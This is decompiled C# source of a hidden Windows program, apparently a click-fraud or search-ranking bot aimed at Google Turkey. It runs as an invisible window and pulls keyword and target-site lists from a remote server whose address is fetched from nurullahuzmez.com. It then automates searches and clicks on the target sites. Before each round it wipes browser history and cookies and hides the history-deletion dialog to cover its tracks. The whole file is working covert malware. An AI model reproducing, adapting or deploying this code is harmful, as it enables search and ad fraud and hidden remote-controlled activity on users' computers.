using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;

namespace ns0;

internal class Form1 : Form
{
	private delegate void Delegate0();

	[CompilerGenerated]
	private sealed class Class1
	{
		public Delegate0 delegate0_0;

		public void method_0(object sender, EventArgs e)
		{
			//IL_000c: Unknown result type (might be due to invalid IL or missing references)
			//IL_0017: Unknown result type (might be due to invalid IL or missing references)
			//IL_0021: Expected O, but got Unknown
			delegate0_0();
			((Timer)sender).Stop();
			((Component)(Timer)sender).Dispose();
		}
	}

	private const int int_0 = 0;

	public const int int_1 = 128;

	private const int int_2 = -20;

	private const int int_3 = 128;

	private const int int_4 = 42;

	private string string_0 = "http://www.nurullahuzmez.com";

	private string string_1 = "http://[DEGISTIR]/v/v.php";

	private Queue<KeyValuePair<string, string>> queue_0 = new Queue<KeyValuePair<string, string>>();

	private string string_2;

	private string string_3;

	private int int_5 = 1;

	private Dictionary<string, bool> dictionary_0 = new Dictionary<string, bool>();

	private Random random_0 = new Random();

	private IContainer icontainer_0;

	private WebBrowser webBrowser1;

	[DllImport("User32")]
	private static extern int ShowWindow(int hwnd, int nCmdShow);

	[DllImport("User32.dll")]
	public static extern int FindWindow(string lpClassName, string lpWindowName);

	[DllImport("user32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int x, int y, int cx, int cy, uint uFlags);

	[DllImport("user32.dll")]
	public static extern bool SetForegroundWindow(IntPtr hWnd);

	[DllImport("user32.dll")]
	public static extern int SetWindowLong(IntPtr window, int index, int value);

	[DllImport("user32.dll")]
	public static extern int GetWindowLong(IntPtr window, int index);

	[DllImport("winmm.dll")]
	public static extern int sndPlaySound(string lpszSoundName, int uFlags);

	[DllImport("wininet.dll", SetLastError = true)]
	private static extern bool InternetSetOption(IntPtr hInternet, int dwOption, IntPtr lpBuffer, int lpdwBufferLength);

	public Form1()
	{
		InitializeComponent();
	}

	private void webBrowser1_NewWindow(object sender, CancelEventArgs e)
	{
		e.Cancel = true;
	}

	private void method_0()
	{
		method_6();
		try
		{
			int_5 = 1;
			KeyValuePair<string, string> keyValuePair = queue_0.Dequeue();
			string_2 = keyValuePair.Key;
			string_3 = keyValuePair.Value;
			while (webBrowser1.get_IsBusy())
			{
				Thread.SpinWait(10000);
			}
			webBrowser1.Navigate("http://www.google.com.tr/advanced_search");
		}
		catch (InvalidOperationException)
		{
			Environment.Exit(-1);
		}
	}

	private void method_1()
	{
		using WebClient webClient = new WebClient();
		string text = "";
		try
		{
			text = webClient.DownloadString(string_1);
		}
		catch (Exception)
		{
			Environment.Exit(-1);
		}
		string[] array = text.Split(new char[1] { '\n' });
		string[] array2 = array;
		foreach (string text2 in array2)
		{
			string[] array3 = text2.Trim().Split(new char[1] { '|' });
			try
			{
				string text3 = array3[1];
				string key = array3[0];
				KeyValuePair<string, string> item = new KeyValuePair<string, string>(key, text3);
				dictionary_0.Add(text3, value: false);
				queue_0.Enqueue(item);
			}
			catch
			{
			}
		}
	}

	private void method_2(string attribute, string value)
	{
		//IL_0039: Unknown result type (might be due to invalid IL or missing references)
		//IL_003f: Expected O, but got Unknown
		if (!(webBrowser1.get_Document() != (HtmlDocument)null))
		{
			return;
		}
		HtmlElementCollection elementsByTagName = webBrowser1.get_Document().GetElementsByTagName("input");
		foreach (HtmlElement item in elementsByTagName)
		{
			HtmlElement val = item;
			if (val.GetAttribute(attribute).Contains(value))
			{
				val.RaiseEvent("onmouseover");
				val.RaiseEvent("onmousedown");
				val.InvokeMember("click");
			}
		}
	}

	private void webBrowser1_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
	{
		string text = e.get_Url().ToString();
		if (text == "http://www.google.com.tr/advanced_search")
		{
			method_9(delegate
			{
				method_7("name", "as_q", string_2);
				method_9(delegate
				{
					method_2("value", "Arama Yap");
				}, 7000, 11000);
			}, 2000, 4000);
		}
		else if (text.StartsWith("http://www.google.com.tr/search?as_q=") && !text.Contains("start="))
		{
			method_9(delegate
			{
				if (!method_8(string_3))
				{
					method_9(method_3, 5000, 12000);
				}
			}, 3000, 6000);
		}
		else if (text.StartsWith("http://www.google.com.tr") && text.Contains("start="))
		{
			method_9(delegate
			{
				if (!method_8(string_3))
				{
					method_9(method_3, 5000, 12000);
				}
			}, 3000, 6000);
		}
		else
		{
			if (!text.Contains(string_3) || text.StartsWith("http://www.google.com"))
			{
				return;
			}
			method_9(delegate
			{
				if (!dictionary_0[string_3])
				{
					dictionary_0[string_3] = true;
					method_4();
				}
			}, 20000, 50000);
		}
	}

	private void method_3()
	{
		//IL_002f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0035: Expected O, but got Unknown
		int_5++;
		HtmlElementCollection links = webBrowser1.get_Document().get_Links();
		foreach (HtmlElement item in links)
		{
			HtmlElement val = item;
			if (val.get_OuterText() == int_5.ToString() || val.get_OuterText() == int_5 + " ")
			{
				val.RaiseEvent("onmouseover");
				val.RaiseEvent("onmousedown");
				val.InvokeMember("click");
			}
		}
	}

	private void method_4()
	{
		//IL_0058: Unknown result type (might be due to invalid IL or missing references)
		//IL_005e: Expected O, but got Unknown
		if (!(webBrowser1.get_Document() != (HtmlDocument)null))
		{
			return;
		}
		HtmlElementCollection elementsByTagName = webBrowser1.get_Document().GetElementsByTagName("a");
		List<HtmlElement> list = new List<HtmlElement>(elementsByTagName.get_Count());
		if (elementsByTagName.get_Count() > 0)
		{
			foreach (HtmlElement item in elementsByTagName)
			{
				HtmlElement val = item;
				if (val.GetAttribute("target") != "_blank" && !string.IsNullOrEmpty(val.get_InnerText()) && method_5(val.GetAttribute("href")))
				{
					list.Add(val);
				}
			}
			if (list.Count > 0)
			{
				list[random_0.Next(list.Count - 1)].RaiseEvent("onmouseover");
				list[random_0.Next(list.Count - 1)].RaiseEvent("onmousedown");
				list[random_0.Next(list.Count - 1)].InvokeMember("click");
				list.Clear();
			}
		}
		method_9(delegate
		{
			method_9(method_0, 240001, 241000);
		}, 5000, 6000);
	}

	private bool method_5(string url)
	{
		if (!url.EndsWith("xml") && !url.EndsWith("@") && !url.EndsWith("SetHomePage") && !url.EndsWith("AddFavorite") && !url.EndsWith(".jpg") && !url.EndsWith(".gif") && !url.EndsWith(".png") && !url.EndsWith(".rar") && !url.EndsWith(".zip") && !url.EndsWith(".vcf") && !url.EndsWith(".exe") && !url.EndsWith(".mp3") && !url.EndsWith(".mp4"))
		{
			return !url.EndsWith("mailto");
		}
		return false;
	}

	private void method_6()
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "RunDll32.exe";
		processStartInfo.Arguments = "InetCpl.cpl,ClearMyTracksByProcess 255";
		Process process = Process.Start(processStartInfo);
		process.WaitForExit();
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo();
		processStartInfo2.FileName = "RunDll32.exe";
		processStartInfo2.Arguments = "InetCpl.cpl,ClearMyTracksByProcess 8";
		Process process2 = Process.Start(processStartInfo2);
		process2.WaitForExit();
		InternetSetOption(IntPtr.Zero, 42, IntPtr.Zero, 0);
	}

	private void method_7(string att, string attname, string attvalue)
	{
		//IL_0039: Unknown result type (might be due to invalid IL or missing references)
		//IL_003f: Expected O, but got Unknown
		if (!(webBrowser1.get_Document() != (HtmlDocument)null))
		{
			return;
		}
		HtmlElementCollection elementsByTagName = webBrowser1.get_Document().GetElementsByTagName("input");
		foreach (HtmlElement item in elementsByTagName)
		{
			HtmlElement val = item;
			if (val.GetAttribute(att).Equals(attname))
			{
				val.SetAttribute("value", attvalue);
			}
		}
	}

	private bool method_8(string url)
	{
		//IL_0041: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		bool result = false;
		List<string> list = new List<string>();
		if (webBrowser1.get_Document() != (HtmlDocument)null)
		{
			HtmlElementCollection links = webBrowser1.get_Document().get_Links();
			{
				foreach (HtmlElement item in links)
				{
					HtmlElement val = item;
					string attribute = val.GetAttribute("href");
					list.Add(attribute);
					if (!attribute.Contains("//webcache.googleusercontent.com") && !attribute.Contains("&amp;q=related:") && val.GetAttribute("href").Contains(url))
					{
						val.RaiseEvent("onmouseover");
						val.RaiseEvent("onmousedown");
						val.InvokeMember("Click");
						return true;
					}
				}
				return result;
			}
		}
		return result;
	}

	private void method_9(Delegate0 x, int min, int max)
	{
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0013: Expected O, but got Unknown
		Timer val = new Timer();
		val.set_Interval(random_0.Next(min, max));
		Timer val2 = val;
		val2.add_Tick((EventHandler)delegate(object sender, EventArgs e)
		{
			//IL_000c: Unknown result type (might be due to invalid IL or missing references)
			//IL_0017: Unknown result type (might be due to invalid IL or missing references)
			//IL_0021: Expected O, but got Unknown
			x();
			((Timer)sender).Stop();
			((Component)(Timer)sender).Dispose();
		});
		val2.Start();
	}

	private void method_10()
	{
		string newValue = "";
		WebHeaderCollection webHeaderCollection = new WebHeaderCollection();
		webHeaderCollection.Add("User-Agent", "Mozilla/4.0 (compatiple; MSIE 6.0; Windows NT 5.1)");
		WebHeaderCollection headers = webHeaderCollection;
		WebClient webClient = new WebClient();
		webClient.Encoding = Encoding.Default;
		webClient.Headers = headers;
		using (WebClient webClient2 = webClient)
		{
			try
			{
				string input = webClient2.DownloadString(string_0);
				Regex regex = new Regex("1(.*?)2", RegexOptions.IgnoreCase | RegexOptions.Compiled);
				Match match = regex.Match(input);
				newValue = match.Groups[1].ToString();
			}
			catch (Exception)
			{
				Environment.Exit(-1);
			}
		}
		string_1 = string_1.Replace("[DEGISTIR]", newValue);
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Form)this).set_Size(new Size(random_0.Next(1024, 1366), random_0.Next(768, 768)));
		int windowLong = GetWindowLong(((Control)this).get_Handle(), -20);
		SetWindowLong(((Control)this).get_Handle(), -20, windowLong | 0x80);
		method_11();
		method_10();
		method_1();
		Class0.smethod_0();
		method_0();
	}

	private void method_11()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		WebBrowser val = new WebBrowser();
		Version version = val.get_Version();
		if (version.Major < 7)
		{
			Environment.Exit(-1);
		}
		val = null;
	}

	private void method_12(object sender, EventArgs e)
	{
		int num = FindWindow(null, "Delete Browsing History");
		if (num != 0)
		{
			ShowWindow(num, 0);
		}
	}

	private unsafe void method_13(object sender, EventArgs e)
	{
		void* ptr = stackalloc byte[8];
		*(int*)ptr = FindWindow(null, "Gözatma Geçmişini Sil");
		if (*(int*)ptr != 0)
		{
			SetWindowPos((IntPtr)(*(int*)ptr), IntPtr.Zero, 0, 0, 0, 0, 128u);
			*(int*)((byte*)ptr + 4) = GetWindowLong((IntPtr)(*(int*)ptr), -20);
			SetWindowLong((IntPtr)(*(int*)ptr), -20, *(int*)((byte*)ptr + 4) | 0x80);
		}
	}

	void Form.Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_0073: Unknown result type (might be due to invalid IL or missing references)
		//IL_007d: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		webBrowser1 = new WebBrowser();
		((Control)this).SuspendLayout();
		componentResourceManager.ApplyResources(webBrowser1, "webBrowser1");
		webBrowser1.set_IsWebBrowserContextMenuEnabled(false);
		((Control)webBrowser1).set_Name("webBrowser1");
		webBrowser1.set_ScriptErrorsSuppressed(true);
		webBrowser1.set_WebBrowserShortcutsEnabled(false);
		webBrowser1.add_DocumentCompleted(new WebBrowserDocumentCompletedEventHandler(webBrowser1_DocumentCompleted));
		webBrowser1.add_NewWindow((CancelEventHandler)webBrowser1_NewWindow);
		componentResourceManager.ApplyResources(this, "$this");
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).get_Controls().Add((Control)(object)webBrowser1);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}

	[CompilerGenerated]
	private void method_14()
	{
		method_7("name", "as_q", string_2);
		method_9(delegate
		{
			method_2("value", "Arama Yap");
		}, 7000, 11000);
	}

	[CompilerGenerated]
	private void method_15()
	{
		if (!method_8(string_3))
		{
			method_9(method_3, 5000, 12000);
		}
	}

	[CompilerGenerated]
	private void method_16()
	{
		if (!method_8(string_3))
		{
			method_9(method_3, 5000, 12000);
		}
	}

	[CompilerGenerated]
	private void method_17()
	{
		if (!dictionary_0[string_3])
		{
			dictionary_0[string_3] = true;
			method_4();
		}
	}

	[CompilerGenerated]
	private void method_18()
	{
		method_2("value", "Arama Yap");
	}

	[CompilerGenerated]
	private void method_19()
	{
		method_9(method_0, 240001, 241000);
	}
}
